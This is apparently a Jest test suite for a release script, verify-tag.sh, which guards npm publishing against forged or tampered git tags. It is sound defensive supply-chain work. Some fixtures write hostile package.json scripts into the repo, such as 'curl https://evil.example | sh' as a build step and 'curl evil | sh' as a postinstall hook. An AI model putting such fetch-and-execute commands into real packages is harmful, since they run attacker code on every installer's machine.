import { writeFileSync } from 'node:fs';
import path from 'node:path';
import { Repo, SCRIPTS, run } from '../testing/repo';

const SCRIPT = path.join(SCRIPTS, 'verify-tag.sh');

/** Checks out `tag` the way publish.yml does, then runs verify-tag.sh against it. */
function verify(repo: Repo, tag: string, env: Record<string, string> = {}) {
  repo.git('checkout', '-q', '--detach', `refs/tags/${tag}`);
  const r = run('bash', [SCRIPT, tag], repo.dir, repo.env(env));
  return { status: r.status, out: r.out, stderr: r.stderr };
}

let repo: Repo;
beforeEach(() => {
  repo = new Repo();
});
afterEach(() => repo.destroy());

const registry = { NPM_STUB_VERSIONS: '6.0.9', NPM_STUB_DIST_TAGS: 'latest=6.0.9 beta=4.6.0-beta.0' };

describe('verify-tag.sh: legitimate tags', () => {
  it('accepts a beta cut from master', () => {
    repo.release('6.0.10-beta.0', 'master');
    const r = verify(repo, 'v6.0.10-beta.0', registry);
    expect(r.status).toBe(0);
    expect(r.out).toMatchObject({ version: '6.0.10-beta.0', dist_tag: 'beta', skip: 'false' });
  });

  it('accepts the whole beta → rc → latest chain', () => {
    repo.release('6.0.10-beta.0', 'master');
    repo.release('6.0.10-rc.0', 'v6.0.10-beta.0');
    repo.release('6.0.10', 'v6.0.10-rc.0');
    expect(verify(repo, 'v6.0.10-rc.0', registry).out).toMatchObject({ dist_tag: 'rc', soaked: '6.0.10-beta.0', skip: 'false' });
    expect(verify(repo, 'v6.0.10', registry).out).toMatchObject({ dist_tag: 'latest', soaked: '6.0.10-rc.0', skip: 'false' });
  });

  it('skips a version that is already on npm', () => {
    repo.release('6.0.10-beta.0', 'master');
    const r = verify(repo, 'v6.0.10-beta.0', { ...registry, NPM_STUB_VERSIONS: '6.0.9 6.0.10-beta.0' });
    expect(r.status).toBe(0);
    expect(r.out.skip).toBe('true');
  });

  it('accepts a first beta when the dist-tag has never been set', () => {
    repo.release('6.0.10-beta.0', 'master');
    expect(verify(repo, 'v6.0.10-beta.0', { NPM_STUB_VERSIONS: '6.0.9', NPM_STUB_DIST_TAGS: 'latest=6.0.9' }).status).toBe(0);
  });
});

describe('verify-tag.sh: forged or malformed tags', () => {
  it('rejects a beta commit that also changes scripts or dependencies', () => {
    repo.release('6.0.10-beta.0', 'master', (pkg) => {
      pkg.scripts.build = 'curl https://evil.example | sh';
      pkg.dependencies = { 'left-pad': '1.3.0' };
    });
    const r = verify(repo, 'v6.0.10-beta.0', registry);
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/changes more than the version/);
  });

  it('rejects a beta commit that also changes the lockfile', () => {
    repo.release('6.0.10-beta.0', 'master', () => {
      writeFileSync(path.join(repo.dir, 'pnpm-lock.yaml'), "lockfileVersion: '9.0'\n# tampered\n");
    });
    const r = verify(repo, 'v6.0.10-beta.0', registry);
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/must change only package\.json/);
  });

  it('rejects a clean GA bump sitting on a forged rc', () => {
    repo.release('6.0.10-beta.0', 'master');
    repo.release('6.0.10-rc.0', 'v6.0.10-beta.0', (pkg) => (pkg.scripts.build = 'evil'));
    repo.release('6.0.10', 'v6.0.10-rc.0');
    expect(verify(repo, 'v6.0.10', registry).status).not.toBe(0);
  });

  it('rejects a commit not authored by the release workflow', () => {
    repo.release('6.0.10-beta.0', 'master', () => {}, 'human@example.com');
    expect(verify(repo, 'v6.0.10-beta.0', registry).stderr).toMatch(/not made by the release workflow/);
  });

  it('rejects a GA that skipped the rc, and an rc that skipped the beta', () => {
    repo.release('6.0.10-beta.0', 'master');
    repo.release('6.0.10', 'v6.0.10-beta.0');
    expect(verify(repo, 'v6.0.10', registry).stderr).toMatch(/parent is not a v6\.0\.10-rc\.\* tag/);
    repo.release('6.0.11-rc.0', 'master');
    expect(verify(repo, 'v6.0.11-rc.0', registry).stderr).toMatch(/parent is not a v6\.0\.11-beta\.\* tag/);
  });

  it('rejects a beta whose parent is not on master', () => {
    repo.git('checkout', '-q', '--detach', 'master');
    repo.write('package.json', { ...repo.read('package.json'), description: 'side branch' });
    repo.commit('side', 'human@example.com');
    const side = repo.git('rev-parse', 'HEAD');
    repo.release('6.0.10-beta.0', side);
    expect(verify(repo, 'v6.0.10-beta.0', registry).stderr).toMatch(/parent is not on master/);
  });

  it('is not fooled by a tag named origin/master pointing at an attacker commit', () => {
    repo.git('checkout', '-q', '--detach', 'master');
    repo.write('package.json', { ...repo.read('package.json'), description: 'attacker' });
    repo.commit('evil', 'human@example.com');
    const evil = repo.git('rev-parse', 'HEAD');
    repo.git('tag', 'origin/master', evil); // shadows the remote-tracking branch for short names
    repo.release('6.0.10-beta.0', evil);
    const r = verify(repo, 'v6.0.10-beta.0', registry);
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/parent is not on master/);
  });

  it('rejects a tag that points somewhere other than the checked-out commit', () => {
    repo.release('6.0.10-beta.0', 'master');
    repo.git('checkout', '-q', '--detach', 'master');
    const r = run('bash', [SCRIPT, 'v6.0.10-beta.0'], repo.dir, repo.env(registry));
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/HEAD is not v6\.0\.10-beta\.0/);
  });

  it('rejects a name that is not a pipeline tag', () => {
    repo.git('tag', '-a', 'v6.0.10-alpha.1', '-m', 'x');
    expect(verify(repo, 'v6.0.10-alpha.1', registry).stderr).toMatch(/is not a pipeline tag/);
  });

  it('still catches a forged change when package.json is too large for a naive in-memory comparison', () => {
    // Regression: a comparison that silently fails on big files compared "" with "" and passed.
    const filler = 'x'.repeat(2 * 1024 * 1024);
    repo.git('checkout', '-q', '--detach', 'master');
    const pkg = repo.read('package.json');
    pkg.filler = filler;
    repo.write('package.json', pkg);
    repo.commit('big package', 'human@example.com');
    const big = repo.git('rev-parse', 'HEAD');
    repo.git('update-ref', 'refs/remotes/origin/master', big);
    repo.release('6.0.10-beta.0', big, (p) => {
      p.scripts.postinstall = 'curl evil | sh';
    });
    expect(verify(repo, 'v6.0.10-beta.0', registry).status).not.toBe(0);
  });
});

describe('verify-tag.sh: the registry', () => {
  it('refuses to move a dist-tag backwards', () => {
    repo.release('6.0.10-beta.0', 'master');
    repo.release('6.0.10-rc.0', 'v6.0.10-beta.0');
    repo.release('6.0.10', 'v6.0.10-rc.0');
    const r = verify(repo, 'v6.0.10', { NPM_STUB_VERSIONS: '6.0.9 6.0.12', NPM_STUB_DIST_TAGS: 'latest=6.0.12' });
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/not newer than latest/);
  });

  it('fails, rather than skipping its checks, when npm cannot be reached', () => {
    repo.release('6.0.10-beta.0', 'master');
    const r = verify(repo, 'v6.0.10-beta.0', { ...registry, NPM_STUB_FAIL: '1' });
    expect(r.status).not.toBe(0);
    expect(r.out.skip).toBeUndefined();
  });
});
